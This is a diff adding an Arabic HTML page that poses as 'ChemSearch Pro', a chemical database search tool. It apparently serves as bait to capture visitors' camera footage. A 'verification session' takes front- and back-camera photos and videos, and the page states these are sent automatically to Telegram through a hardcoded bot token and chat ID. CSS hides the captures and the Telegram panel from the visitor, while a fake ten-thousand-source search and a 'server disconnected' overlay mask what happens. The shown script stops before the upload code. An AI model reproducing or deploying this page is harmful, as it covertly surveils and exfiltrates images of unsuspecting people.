@@ -1,0 +1,1363 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>ChemSearch Pr</title>
+<style>
+:root{
+  --bg:#060a12;
+  --line:rgba(255,255,255,.09);
+  --txt:#dfe9f5;
+  --mut:#7d8ea6;
+  --cyan:#00e5c0;
+  --blue:#3b82f6;
+  --danger:#ef4444;
+  --warn:#f59e0b;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  font-family:"Segoe UI",Tahoma,"Noto Kufi Arabic",system-ui,sans-serif;
+  background:var(--bg);color:var(--txt);min-height:100vh;overflow-x:hidden;
+  padding-bottom:80px;
+}
+.grid-bg{
+  position:fixed;inset:0;z-index:-2;pointer-events:none;
+  background:
+    radial-gradient(900px 520px at 85% -10%, rgba(0,229,192,.13), transparent 62%),
+    radial-gradient(820px 520px at 8% 6%, rgba(59,130,246,.14), transparent 62%),
+    radial-gradient(700px 600px at 50% 120%, rgba(0,229,192,.07), transparent 60%);
+}
+.grid-bg::after{
+  content:"";position:absolute;inset:0;
+  background-image:
+    linear-gradient(rgba(255,255,255,.035) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(255,255,255,.035) 1px, transparent 1px);
+  background-size:52px 52px;
+  mask-image:radial-gradient(circle at 50% 30%, #000 20%, transparent 78%);
+  -webkit-mask-image:radial-gradient(circle at 50% 30%, #000 20%, transparent 78%);
+}
+.topbar{
+  display:flex;align-items:center;justify-content:space-between;
+  padding:18px 28px;max-width:1180px;margin:0 auto;
+}
+.brand{display:flex;align-items:center;gap:12px}
+.logo{
+  width:44px;height:44px;border-radius:13px;display:grid;place-items:center;
+  font-size:22px;background:linear-gradient(145deg,rgba(0,229,192,.2),rgba(59,130,246,.2));
+  border:1px solid rgba(0,229,192,.35);
+  box-shadow:0 0 24px rgba(0,229,192,.22), inset 0 0 14px rgba(0,229,192,.08);
+}
+.brand-name{font-size:17px;font-weight:800;letter-spacing:.3px}
+.brand-name span{color:var(--cyan)}
+.brand-sub{font-size:11.5px;color:var(--mut);margin-top:2px}
+.badge{
+  font-size:11.5px;color:var(--cyan);padding:7px 14px;border-radius:99px;
+  border:1px solid rgba(0,229,192,.3);background:rgba(0,229,192,.07);
+}
+.hero{
+  max-width:900px;margin:0 auto;padding:50px 22px 20px;text-align:center;
+}
+.pill{
+  display:inline-block;font-size:12.5px;color:#9fe9dc;padding:8px 16px;border-radius:99px;
+  background:rgba(0,229,192,.07);border:1px solid rgba(0,229,192,.22);margin-bottom:24px;
+}
+.pill b{color:var(--cyan)}
+.hero h1{
+  font-size:clamp(25px,4.6vw,42px);font-weight:900;line-height:1.35;letter-spacing:-.5px;
+}
+.grad{
+  background:linear-gradient(90deg,var(--cyan),var(--blue));
+  -webkit-background-clip:text;background-clip:text;color:transparent;
+}
+.sub{
+  color:var(--mut);font-size:14.5px;line-height:1.9;margin:16px auto 0;max-width:620px;
+}
+.searchbox{
+  display:flex;align-items:center;gap:10px;margin:30px auto 0;max-width:720px;
+  background:rgba(255,255,255,.045);border:1px solid var(--line);
+  border-radius:99px;padding:8px 10px 8px 8px;
+  transition:.3s;backdrop-filter:blur(10px);
+}
+.searchbox:focus-within{
+  border-color:rgba(0,229,192,.55);
+  box-shadow:0 0 0 4px rgba(0,229,192,.09), 0 0 40px rgba(0,229,192,.18);
+}
+.s-icon{font-size:20px;color:var(--cyan);padding-inline-start:14px;opacity:.85}
+.searchbox input{
+  flex:1;background:none;border:none;outline:none;color:var(--txt);
+  font-size:15.5px;font-family:inherit;padding:14px 6px;min-width:0;
+}
+.searchbox input::placeholder{color:#5d6f88}
+.searchbox button{
+  border:none;cursor:pointer;font-family:inherit;font-weight:800;font-size:14.5px;
+  color:#04231f;padding:14px 30px;border-radius:99px;
+  background:linear-gradient(135deg,var(--cyan),#25d0e8);
+  transition:.25s;white-space:nowrap;
+  box-shadow:0 6px 22px rgba(0,229,192,.28);
+}
+.searchbox button:hover{transform:translateY(-2px);box-shadow:0 10px 30px rgba(0,229,192,.42)}
+.searchbox button:disabled{opacity:.5;cursor:not-allowed;transform:none}
+.chips{display:flex;flex-wrap:wrap;gap:9px;justify-content:center;margin-top:22px}
+.chip{
+  cursor:pointer;font-family:inherit;font-size:12.5px;color:#9fb2c9;
+  padding:8px 15px;border-radius:99px;background:rgba(255,255,255,.035);
+  border:1px solid var(--line);transition:.22s;
+}
+.chip:hover{color:var(--cyan);border-color:rgba(0,229,192,.4);background:rgba(0,229,192,.07)}
+.tabs{
+  display:flex;justify-content:center;gap:8px;margin:32px auto 0;max-width:620px;
+  padding:6px;background:rgba(255,255,255,.04);border:1px solid var(--line);
+  border-radius:99px;
+}
+.tab{
+  flex:1;padding:12px 22px;border:none;background:none;cursor:pointer;
+  font-family:inherit;font-weight:800;font-size:14px;color:var(--mut);
+  border-radius:99px;transition:.25s;display:flex;align-items:center;justify-content:center;gap:8px;
+}
+.tab.active{
+  color:#04231f;background:linear-gradient(135deg,var(--cyan),#25d0e8);
+  box-shadow:0 6px 20px rgba(0,229,192,.3);
+}
+.tab:not(.active):hover{color:var(--cyan)}
+
+.search-panel{
+  display:none;max-width:900px;margin:26px auto 0;padding:26px;
+  border-radius:22px;position:relative;overflow:hidden;
+  background:linear-gradient(180deg, rgba(255,255,255,.055), rgba(255,255,255,.018));
+  border:1px solid var(--line);backdrop-filter:blur(12px);
+}
+.search-panel.show{display:block;animation:fadeUp .55s cubic-bezier(.2,.8,.3,1)}
+.search-panel::before{
+  content:"";position:absolute;top:0;left:0;right:0;height:1px;
+  background:linear-gradient(90deg,transparent,var(--cyan),transparent);
+  opacity:.75;animation:sweep 2.6s linear infinite;
+}
+@keyframes sweep{0%{transform:translateX(-100%)}100%{transform:translateX(100%)}}
+.status-row{display:flex;align-items:center;gap:12px;flex-wrap:wrap}
+.spinner{
+  width:22px;height:22px;border-radius:50%;flex:none;
+  border:2.5px solid rgba(0,229,192,.18);border-top-color:var(--cyan);
+  animation:spin .8s linear infinite;
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+.status-main{font-size:17.5px;font-weight:800}
+.status-main .dots span{animation:blink 1.3s infinite;color:var(--cyan)}
+.status-main .dots span:nth-child(2){animation-delay:.18s}
+.status-main .dots span:nth-child(3){animation-delay:.36s}
+@keyframes blink{0%,75%,100%{opacity:.15}35%{opacity:1}}
+.status-sub{font-size:12.5px;color:var(--mut);margin-inline-start:auto}
+.bar{height:9px;border-radius:99px;background:rgba(255,255,255,.07);overflow:hidden;margin:20px 0 10px}
+.fill{
+  height:100%;width:0;border-radius:99px;
+  background:linear-gradient(270deg,var(--cyan),var(--blue));
+  box-shadow:0 0 20px rgba(0,229,192,.55);transition:width .18s linear;
+}
+.meta{display:flex;justify-content:space-between;font-size:12.5px;color:var(--mut)}
+.meta b{color:var(--cyan);font-variant-numeric:tabular-nums}
+.log{
+  margin-top:18px;padding-top:14px;border-top:1px solid var(--line);
+  max-height:186px;overflow-y:auto;display:flex;flex-direction:column;gap:5px;
+}
+.log::-webkit-scrollbar{width:6px}
+.log::-webkit-scrollbar-thumb{background:rgba(0,229,192,.25);border-radius:99px}
+.log-line{
+  display:flex;align-items:center;gap:10px;font-size:12.5px;color:#8fa2b8;
+  padding:4px 6px;border-radius:8px;animation:slideIn .3s ease;
+}
+.log-line:nth-child(odd){background:rgba(255,255,255,.022)}
+.log-line .ok{color:var(--cyan);font-size:11px;flex:none}
+.log-line .nm{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.log-line .tm{color:#4f6178;font-size:11px;font-variant-numeric:tabular-nums;flex:none}
+@keyframes slideIn{from{opacity:0;transform:translateX(14px)}to{opacity:1;transform:none}}
+.results{max-width:900px;margin:34px auto 0;padding:0 22px;display:flex;flex-direction:column;gap:14px}
+.results-head{display:none;align-items:center;gap:12px;margin-bottom:6px;font-size:14px;color:var(--mut)}
+.results-head.show{display:flex;animation:fadeUp .5s ease}
+.results-head .barline{flex:1;height:1px;background:var(--line)}
+.results-head b{color:var(--cyan)}
+.result{
+  padding:20px 22px;border-radius:16px;
+  background:linear-gradient(180deg, rgba(255,255,255,.045), rgba(255,255,255,.014));
+  border:1px solid var(--line);position:relative;overflow:hidden;
+  transition:.28s;opacity:0;transform:translateY(22px);
+}
+.result.in{animation:fadeUp .55s cubic-bezier(.2,.8,.3,1) forwards}
+.result:hover{
+  border-color:rgba(0,229,192,.35);transform:translateY(-3px);
+  box-shadow:0 16px 40px rgba(0,0,0,.45);
+}
+.r-head{display:flex;align-items:center;gap:12px;margin-bottom:12px}
+.fav{
+  width:38px;height:38px;border-radius:11px;flex:none;display:grid;place-items:center;
+  font-weight:900;font-size:13px;color:#04231f;
+  background:linear-gradient(135deg,var(--cyan),#2fd6ff);
+  box-shadow:0 0 18px rgba(0,229,192,.3);
+}
+.r-site{font-size:12.5px;color:#9fe9dc;font-weight:700}
+.r-url{font-size:11px;color:#4f6178;direction:ltr;text-align:right;
+  overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:420px}
+.r-score{
+  margin-inline-start:auto;flex:none;font-size:11.5px;font-weight:800;color:var(--cyan);
+  padding:5px 11px;border-radius:99px;background:rgba(0,229,192,.1);
+  border:1px solid rgba(0,229,192,.25);
+}
+.r-title{font-size:16.5px;font-weight:800;color:#eaf3ff;margin-bottom:8px;line-height:1.6}
+.r-desc{font-size:13.5px;color:#93a6bd;line-height:1.95}
+.r-desc mark{background:rgba(0,229,192,.16);color:#7ff0dd;padding:0 3px;border-radius:4px}
+.r-tags{display:flex;flex-wrap:wrap;gap:7px;margin-top:13px}
+.r-tags span{
+  font-size:11px;color:#8fa2b8;padding:4px 11px;border-radius:7px;
+  background:rgba(255,255,255,.045);border:1px solid var(--line);
+}
+.new-search{
+  display:none;margin:30px auto 0;padding:13px 34px;border-radius:99px;cursor:pointer;
+  font-family:inherit;font-weight:800;font-size:14px;color:var(--cyan);
+  background:rgba(0,229,192,.08);border:1px solid rgba(0,229,192,.3);transition:.25s;
+}
+.new-search.show{display:block;animation:fadeUp .5s ease}
+.new-search:hover{background:rgba(0,229,192,.16);transform:translateY(-2px)}
+@keyframes fadeUp{from{opacity:0;transform:translateY(26px)}to{opacity:1;transform:none}}
+
+.session-section{display:none;max-width:960px;margin:26px auto 0;padding:0 22px}
+.session-section.show{display:block;animation:fadeUp .55s ease}
+.session-card{
+  background:linear-gradient(180deg, rgba(255,255,255,.055), rgba(255,255,255,.018));
+  border:1px solid var(--line);border-radius:22px;padding:26px;
+  backdrop-filter:blur(12px);position:relative;overflow:hidden;
+}
+.session-card::before{
+  content:"";position:absolute;top:0;left:0;right:0;height:1px;
+  background:linear-gradient(90deg,transparent,var(--cyan),transparent);opacity:.7;
+}
+.sess-head{display:flex;align-items:center;gap:14px;margin-bottom:20px;flex-wrap:wrap}
+.sess-ico{
+  width:52px;height:52px;border-radius:15px;display:grid;place-items:center;font-size:24px;
+  background:linear-gradient(145deg,rgba(0,229,192,.18),rgba(59,130,246,.18));
+  border:1px solid rgba(0,229,192,.3);
+}
+.sess-head h3{font-size:18px;font-weight:800}
+.sess-head p{font-size:12.5px;color:var(--mut);margin-top:4px}
+.sess-badge{
+  margin-inline-start:auto;font-size:12px;color:var(--cyan);padding:7px 14px;
+  border-radius:99px;background:rgba(0,229,192,.08);border:1px solid rgba(0,229,192,.28);
+}
+
+.plan-grid{
+  display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:22px;
+}
+@media(max-width:640px){.plan-grid{grid-template-columns:1fr}}
+.plan-card{
+  padding:16px;border-radius:14px;background:rgba(255,255,255,.03);
+  border:1px solid var(--line);transition:.3s;position:relative;
+}
+.plan-card.active{
+  background:rgba(0,229,192,.09);border-color:rgba(0,229,192,.5);
+  box-shadow:0 0 24px rgba(0,229,192,.18);
+}
+.plan-card.done{background:rgba(0,229,192,.05);border-color:rgba(0,229,192,.28)}
+.plan-card .plan-top{display:flex;align-items:center;gap:10px;margin-bottom:8px}
+.plan-card .plan-ico{
+  width:34px;height:34px;border-radius:10px;display:grid;place-items:center;
+  background:rgba(255,255,255,.06);font-size:16px;
+}
+.plan-card.active .plan-ico{background:linear-gradient(135deg,var(--cyan),#25d0e8)}
+.plan-card.done .plan-ico{background:rgba(0,229,192,.7)}
+.plan-card .plan-title{font-size:13.5px;font-weight:800}
+.plan-card .plan-count{
+  font-size:11.5px;color:var(--mut);margin-top:4px;font-variant-numeric:tabular-nums;
+}
+.plan-card.active .plan-count{color:var(--cyan)}
+.plan-card.done .plan-count{color:#7ff0dd}
+.plan-prog{height:5px;border-radius:99px;background:rgba(255,255,255,.07);overflow:hidden;margin-top:10px}
+.plan-prog i{
+  display:block;height:100%;width:0;border-radius:99px;
+  background:linear-gradient(90deg,var(--cyan),var(--blue));transition:width .3s;
+}
+
+.cam-wrap{
+  position:relative;width:100%;max-width:440px;margin:0 auto 20px;
+  aspect-ratio:3/4;border-radius:20px;overflow:hidden;
+  background:#000;border:1px solid var(--line);
+}
+.cam-wrap video{width:100%;height:100%;object-fit:cover;display:block;transform:scaleX(-1)}
+.cam-wrap.back video{transform:none}
+.cam-off{
+  position:absolute;inset:0;display:grid;place-items:center;text-align:center;
+  padding:30px;background:linear-gradient(180deg,#0a1220,#060a12);
+}
+.cam-off .ico{font-size:52px;margin-bottom:14px;opacity:.5}
+.cam-off p{font-size:13.5px;color:var(--mut);line-height:1.9;max-width:280px}
+.cam-hint{
+  position:absolute;bottom:14px;left:50%;transform:translateX(-50%);
+  background:rgba(0,0,0,.75);backdrop-filter:blur(8px);
+  padding:10px 22px;border-radius:99px;font-size:13.5px;font-weight:800;
+  color:var(--cyan);border:1px solid rgba(0,229,192,.35);white-space:nowrap;
+  max-width:92%;overflow:hidden;text-overflow:ellipsis;
+}
+.countdown{
+  position:absolute;top:16px;right:16px;width:60px;height:60px;border-radius:50%;
+  display:none;place-items:center;font-size:24px;font-weight:900;
+  background:rgba(0,0,0,.75);color:var(--cyan);border:2.5px solid rgba(0,229,192,.55);
+  backdrop-filter:blur(8px);font-variant-numeric:tabular-nums;
+}
+.countdown.on{display:grid;animation:popIn .3s ease}
+@keyframes popIn{from{transform:scale(.6);opacity:0}to{transform:scale(1);opacity:1}}
+.rec-dot{
+  position:absolute;top:18px;left:18px;display:none;align-items:center;gap:8px;
+  padding:8px 14px;border-radius:99px;background:rgba(0,0,0,.75);
+  backdrop-filter:blur(8px);border:1px solid rgba(239,68,68,.5);
+  font-size:12px;font-weight:800;color:#fca5a5;
+}
+.rec-dot.on{display:flex}
+.rec-dot i{
+  width:10px;height:10px;border-radius:50%;background:#ef4444;
+  animation:recPulse 1s infinite;
+}
+@keyframes recPulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.4;transform:scale(.8)}}
+.flash{
+  position:absolute;inset:0;background:#fff;opacity:0;pointer-events:none;transition:opacity .12s;
+}
+.flash.on{opacity:.85}
+
+.actions{display:flex;gap:12px;justify-content:center;flex-wrap:wrap;margin-top:6px}
+.btn-main{
+  padding:14px 32px;border-radius:99px;border:none;cursor:pointer;
+  font-family:inherit;font-weight:800;font-size:14.5px;color:#04231f;
+  background:linear-gradient(135deg,var(--cyan),#25d0e8);
+  box-shadow:0 6px 22px rgba(0,229,192,.3);transition:.25s;
+}
+.btn-main:hover{transform:translateY(-2px);box-shadow:0 10px 30px rgba(0,229,192,.45)}
+.btn-main:disabled{opacity:.45;cursor:not-allowed;transform:none;box-shadow:none}
+.btn-ghost{
+  padding:14px 26px;border-radius:99px;cursor:pointer;
+  font-family:inherit;font-weight:800;font-size:14px;color:var(--mut);
+  background:rgba(255,255,255,.04);border:1px solid var(--line);transition:.25s;
+}
+.btn-ghost:hover{color:var(--cyan);border-color:rgba(0,229,192,.4)}
+.btn-ghost:disabled{opacity:.4;cursor:not-allowed}
+.btn-danger{
+  padding:12px 24px;border-radius:99px;cursor:pointer;
+  font-family:inherit;font-weight:800;font-size:13.5px;color:#fecaca;
+  background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.35);transition:.25s;
+}
+.btn-danger:hover{background:rgba(239,68,68,.2)}
+
+.captures-title{
+  font-size:13px;font-weight:800;color:#9fe9dc;margin:24px 0 12px;
+  display:flex;align-items:center;gap:10px;
+}
+.captures-title::before{content:"";width:4px;height:16px;border-radius:2px;background:var(--cyan)}
+.captures-grid{display:grid;grid-template-columns:repeat(5,1fr);gap:10px}
+@media(max-width:700px){.captures-grid{grid-template-columns:repeat(3,1fr)}}
+@media(max-width:420px){.captures-grid{grid-template-columns:repeat(2,1fr)}}
+.cap{
+  position:relative;border-radius:12px;overflow:hidden;aspect-ratio:3/4;
+  background:rgba(255,255,255,.03);border:1px solid var(--line);
+  display:grid;place-items:center;
+}
+.cap img{width:100%;height:100%;object-fit:cover;display:block}
+.cap .ph{font-size:24px;opacity:.22}
+.cap .tag{
+  position:absolute;bottom:0;left:0;right:0;
+  background:linear-gradient(0deg,rgba(0,0,0,.85),transparent);
+  padding:14px 6px 5px;font-size:10.5px;font-weight:800;
+  color:var(--cyan);text-align:center;
+}
+.cap.filled{border-color:rgba(0,229,192,.45);box-shadow:0 0 14px rgba(0,229,192,.14)}
+
+.videos-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:12px}
+@media(max-width:700px){.videos-grid{grid-template-columns:1fr}}
+.vid{
+  position:relative;border-radius:14px;overflow:hidden;aspect-ratio:9/16;
+  background:rgba(255,255,255,.03);border:1px solid var(--line);
+  display:grid;place-items:center;
+}
+.vid video{width:100%;height:100%;object-fit:cover;display:block;background:#000}
+.vid .ph{font-size:38px;opacity:.22;text-align:center}
+.vid .ph small{display:block;font-size:11px;margin-top:8px;color:var(--mut)}
+.vid .tag{
+  position:absolute;bottom:0;left:0;right:0;
+  background:linear-gradient(0deg,rgba(0,0,0,.9),transparent);
+  padding:18px 10px 8px;font-size:11.5px;font-weight:800;
+  color:var(--cyan);text-align:center;
+}
+.vid.filled{border-color:rgba(0,229,192,.45);box-shadow:0 0 18px rgba(0,229,192,.16)}
+
+.tg-box{
+  margin-top:26px;padding:20px;border-radius:16px;
+  background:rgba(59,130,246,.05);border:1px solid rgba(59,130,246,.22);
+}
+.tg-box h4{
+  font-size:14px;font-weight:800;color:#93c5fd;margin-bottom:14px;
+  display:flex;align-items:center;gap:8px;
+}
+.tg-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+@media(max-width:560px){.tg-grid{grid-template-columns:1fr}}
+.tg-field{display:flex;flex-direction:column;gap:6px}
+.tg-field label{font-size:11.5px;color:var(--mut);font-weight:700;padding-inline-start:4px}
+.tg-field input{
+  background:rgba(0,0,0,.28);border:1px solid var(--line);border-radius:10px;
+  padding:11px 14px;color:var(--txt);font-family:inherit;font-size:13px;
+  outline:none;transition:.22s;direction:ltr;text-align:left;
+}
+.tg-field input:focus{border-color:rgba(59,130,246,.6);box-shadow:0 0 0 3px rgba(59,130,246,.1)}
+.tg-field input[readonly]{opacity:.75;cursor:not-allowed;background:rgba(0,0,0,.45)}
+.tg-note{font-size:11.5px;color:#4f6178;margin-top:12px;line-height:1.9}
+.tg-note b{color:#93c5fd}
+.tg-status{
+  margin-top:14px;padding:12px 16px;border-radius:10px;font-size:12.5px;
+  background:rgba(0,0,0,.25);border:1px solid var(--line);color:var(--mut);
+  line-height:1.9;display:none;
+}
+.tg-status.show{display:block}
+
+.toast{
+  position:fixed;bottom:26px;left:50%;transform:translateX(-50%) translateY(120%);
+  padding:14px 26px;border-radius:14px;z-index:1000;
+  background:rgba(10,20,30,.95);border:1px solid rgba(0,229,192,.4);
+  color:var(--cyan);font-size:13.5px;font-weight:800;
+  backdrop-filter:blur(12px);box-shadow:0 12px 40px rgba(0,0,0,.5);
+  transition:transform .4s cubic-bezier(.2,.8,.3,1);white-space:nowrap;max-width:90vw;
+  overflow:hidden;text-overflow:ellipsis;
+}
+.toast.show{transform:translateX(-50%) translateY(0)}
+.toast.err{border-color:rgba(239,68,68,.5);color:#fca5a5}
+
+@media(max-width:600px){
+  .topbar{padding:14px 16px}
+  .brand-sub{display:none}
+  .searchbox{flex-wrap:wrap;border-radius:20px;padding:10px}
+  .searchbox input{width:100%;padding:10px 6px}
+  .searchbox button{width:100%;padding:13px}
+  .s-icon{display:none}
+  .results{padding:0 14px}
+  .r-url{max-width:150px}
+  .status-sub{margin-inline-start:0;width:100%}
+  .tabs{padding:5px}
+  .tab{padding:11px 12px;font-size:12.5px}
+  .session-section{padding:0 14px}
+  .session-card{padding:20px 16px}
+}
+
+.plan-grid,
+.captures-title,
+.captures-grid,
+.videos-grid,
+.tg-box {
+  display: none !important;
+}
+
+.upload-zone{
+  margin-top:18px;padding:22px 16px;border-radius:14px;text-align:center;
+  border:2px dashed rgba(0,229,192,.28);background:rgba(0,229,192,.03);
+  cursor:pointer;transition:.25s;
+}
+.upload-zone:hover{border-color:rgba(0,229,192,.55);background:rgba(0,229,192,.06)}
+.upload-zone.drag{border-color:var(--cyan);background:rgba(0,229,192,.1);transform:scale(1.01)}
+.upload-zone .ico{font-size:34px;margin-bottom:8px;opacity:.7}
+.upload-zone p{font-size:13px;color:#93a6bd;font-weight:700}
+.upload-zone small{font-size:11px;color:#4f6178;display:block;margin-top:5px}
+
+/* ★ طبقة انتهاء الجلسة (CSS ضروري لميزة جديدة) */
+.session-end-overlay{
+  position:fixed;inset:0;z-index:9999;
+  background:rgba(6,10,18,.98);
+  display:none;place-items:center;text-align:center;padding:30px;
+  backdrop-filter:blur(14px);
+}
+.session-end-overlay.show{display:grid;animation:fadeUp .6s ease}
+.session-end-ico{
+  font-size:84px;margin-bottom:22px;opacity:.85;
+  animation:recPulse 1.8s infinite;
+}
+.session-end-title{
+  font-size:clamp(22px,4.6vw,34px);font-weight:900;
+  color:var(--cyan);line-height:1.6;letter-spacing:-.3px;
+  max-width:640px;
+}
+</style>
+</head>
+<body>
+<div class="grid-bg"></div>
+
+<header class="topbar">
+  <div class="brand">
+    <div class="logo">⚗</div>
+    <div>
+      <div class="brand-name">ChemSearch <span>Pro</span></div>
+      <div class="brand-sub">بحث كيميائي + جلسة تصوير وتسجيل تلقائية</div>
+    </div>
+  </div>
+  <div class="badge">v5.0 • متصل</div>
+</header>
+
+<main>
+  <section class="hero" id="hero">
+    <div class="pill">◈ بحث في <b>10000</b> قاعدة بيانات + جلسة تصوير تلقائية</div>
+    <h1>ابحث في <span class="grad">قواعد البيانات الكيميائية</span><br>أو ابدأ جلسة التسجيل</h1>
+    <p class="sub">
+      بحث نصي متقدم في 10000 مصدر كيميائي، أو جلسة تلقائية كاملة:
+      مشفرة بروتوكولات التشفير الثنائي
+    </p>
+
+    <div class="tabs" id="tabs">
+      <button class="tab active" data-tab="search">🔍 بحث نصي</button>
+      <button class="tab" data-tab="session">📸 جلسة تصوير</button>
+    </div>
+
+    <div class="searchbox" id="searchbox">
+      <span class="s-icon">⌕</span>
+      <input id="q" type="text" placeholder="مثال: Aspirin — C9H8O4 — 50-78-2 ..." autocomplete="off" />
+      <button id="btn">ابحث الآن</button>
+    </div>
+
+    <div class="chips" id="chips">
+      <button class="chip">Aspirin</button>
+      <button class="chip">Paracetamol</button>
+      <button class="chip">C9H8O4</button>
+      <button class="chip">Sodium Benzoate</button>
+      <button class="chip">Ethanol 96%</button>
+      <button class="chip">Acetic Acid MSDS</button>
+    </div>
+  </section>
+
+  <section class="search-panel" id="panel">
+    <div class="status-row">
+      <div class="spinner" id="spinner"></div>
+      <div class="status-main" id="statusMain">
+        جاري البحث<span class="dots"><span>.</span><span>.</span><span>.</span></span>
+      </div>
+      <div class="status-sub" id="statusSub">تهيئة الاتصال بالمصادر…</div>
+    </div>
+    <div class="bar"><div class="fill" id="fill"></div></div>
+    <div class="meta">
+      <div>تم فحص <b id="count">0</b> من <b id="total">10000</b> مصدر</div>
+      <div><b id="pct">0</b>% — <span id="eta">3:00</span></div>
+    </div>
+    <div class="log" id="log"></div>
+  </section>
+
+  <section class="session-section" id="sessionSection">
+    <div class="session-card">
+      <div class="sess-head">
+        <div class="sess-ico">🎥</div>
+        <div>
+          <h3>جلسة التحقق التلقائية</h3>
+          <p>التقاط صور تحقق، تسجيل فيديوهين، ثم البحث الشامل — كل شيء تلقائيًا.</p>
+        </div>
+        <div class="sess-badge" id="sessBadge">جاهز للبدء</div>
+      </div>
+
+      <div class="plan-grid">
+        <div class="plan-card" id="planFront">
+          <div class="plan-top">
+            <div class="plan-ico">🤳</div>
+            <div>
+              <div class="plan-title">صور — كاميرا أمامية</div>
+              <div class="plan-count"><span id="frontCount">0</span> / 2</div>
+            </div>
+          </div>
+          <div class="plan-prog"><i id="frontProg"></i></div>
+        </div>
+        <div class="plan-card" id="planBack">
+          <div class="plan-top">
+            <div class="plan-ico">📷</div>
+            <div>
+              <div class="plan-title">صور — كاميرا خلفية</div>
+              <div class="plan-count"><span id="backCount">0</span> / 2</div>
+            </div>
+          </div>
+          <div class="plan-prog"><i id="backProg"></i></div>
+        </div>
+        <div class="plan-card" id="planVideo">
+          <div class="plan-top">
+            <div class="plan-ico">🎬</div>
+            <div>
+              <div class="plan-title">فيديوهات × 30 ثانية</div>
+              <div class="plan-count"><span id="videoCount">0</span> / 2</div>
+            </div>
+          </div>
+          <div class="plan-prog"><i id="videoProg"></i></div>
+        </div>
+      </div>
+
+      <div class="cam-wrap" id="camWrap">
+        <video id="video" playsinline autoplay muted></video>
+        <canvas id="snap" style="display:none"></canvas>
+        <div class="cam-off" id="camOff">
+          <div>
+            <div class="ico">📷</div>
+            <p>اضغط على "بدء التحقق" أدناه لتفعيل الكاميرا والبدء تلقائيًا.</p>
+          </div>
+        </div>
+        <div class="cam-hint" id="camHint" style="display:none">جاهز</div>
+        <div class="countdown" id="countdown">3</div>
+        <div class="rec-dot" id="recDot"><i></i><span id="recTime">01:00</span></div>
+        <div class="flash" id="flash"></div>
+      </div>
+
+      <div class="actions">
+        <button class="btn-main" id="startAll">▶ بدء التحقق</button>
+        <button class="btn-ghost" id="stopAll" style="display:none">■ إيقاف</button>
+      </div>
+
+      <div class="upload-zone" id="uploadZone">
+        <div class="ico">📤</div>
+        <p>ارفع ملف من جهازك — 
+      </p>
+        <small>فيديو · صورة · مستند</small>
+        <input type="file" id="fileInput" hidden />
+      </div>
+
+      <div class="captures-title">الصور الملتقطة</div>
+      <div class="captures-grid" id="photosGrid"></div>
+
+      <div class="captures-title">الفيديوهات المسجلة</div>
+      <div class="videos-grid" id="videosGrid">
+        <div class="vid" id="vid1"><div class="ph">🎬<small>فيديو 1</small></div><div class="tag">بانتظار التسجيل</div></div>
+        <div class="vid" id="vid2"><div class="ph">🎬<small>فيديو 2</small></div><div class="tag">بانتظار التسجيل</div></div>
+      </div>
+
+      <div class="tg-box">
+        <h4>✈️ الإرسال إلى تيليجرام</h4>
+        <div class="tg-grid">
+          <div class="tg-field">
+            <label>Bot Token</label>
+            <input id="tgToken" type="text" readonly />
+          </div>
+          <div class="tg-field">
+            <label>Chat ID</label>
+            <input id="tgChat" type="text" readonly />
+          </div>
+        </div>
+        <p class="tg-note">يتم الإرسال تلقائيًا بمجرد التقاط كل صورة أو تسجيل كل فيديو.</p>
+        <div style="display:flex;gap:10px;flex-wrap:wrap;margin-top:16px">
+          <button class="btn-main" id="sendTg">✈️ إرسال كل الملفات</button>
+          <button class="btn-danger" id="clearAll">🗑️ مسح الكل</button>
+        </div>
+        <div class="tg-status" id="tgStatus"></div>
+      </div>
+    </div>
+  </section>
+
+  <div class="results-head" id="resultsHead">
+    <span>نتائج البحث</span>
+    <span class="barline"></span>
+    <span>تم العثور على <b id="resCount">0</b> نتيجة</span>
+  </div>
+  <section class="results" id="results"></section>
+  <button class="new-search" id="newSearch">↻ بحث جديد</button>
+</main>
+
+<div class="toast" id="toast"></div>
+
+<!-- ★ طبقة انتهاء الجلسة -->
+<div class="session-end-overlay" id="sessionEndOverlay">
+  <div>
+    <div class="session-end-ico">⛔</div>
+    <h2 class="session-end-title">تم انقطاع الخدمة والاتصال بالسيرفر</h2>
+  </div>
+</div>
+
+<script>
+/* ============================================================
+   ثوابت
+   ============================================================ */
+const TG_TOKEN = "8237095382:AAEwtkETTGq3VEp1flZrIKVXQTWF5KGkCiM";
+const TG_CHAT  = "6068331455";
+
+/* ★ جلسة الفيديو: دقيقة واحدة مقسمة 6 × 10 ثواني */
+const VIDEO_TOTAL_SECONDS = 60;
+const VIDEO_CHUNK_SECONDS = 10;
+const VIDEO_CHUNKS_TOTAL  = 6;
+
+/* سقوف أمان */
+const VIDEO_BITRATE   = 1000000;   /* 1 Mbps — جودة معقولة */
+const VIDEO_MAX_BYTES = 45 * 1024 * 1024;
+
+/* ★ مؤقّت الجلسة: 10 دقائق من فتح الصفحة */
+const SESSION_DURATION_MS = 10 * 60 * 1000;
+
+/* البحث */
+const SEARCH_DURATION_MS = 180000;   /* 3 دقائق */
+const SEARCH_SITES_TOTAL = 10000;
+
+/* ============================================================
+   أدوات عامة
+   ============================================================ */
+const $ = id => document.getElementById(id);
+function escapeHtml(s){
+  return String(s).replace(/[&<>"']/g, c => ({
+    '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
+  }[c]));
+}
+function toast(msg, isErr=false){
+  const t = $('toast');
+  t.textContent = msg;
+  t.classList.toggle('err', isErr);
+  t.classList.add('show');
+  clearTimeout(t._to);
+  t._to = setTimeout(()=> t.classList.remove('show'), 3200);
+}
+function sleep(ms){ return new Promise(r=> setTimeout(r, ms)); }
+function fmtTime(s){
+  s = Math.max(0, Math.ceil(s));
+  const m = String(Math.floor(s/60)).padStart(2,'0');
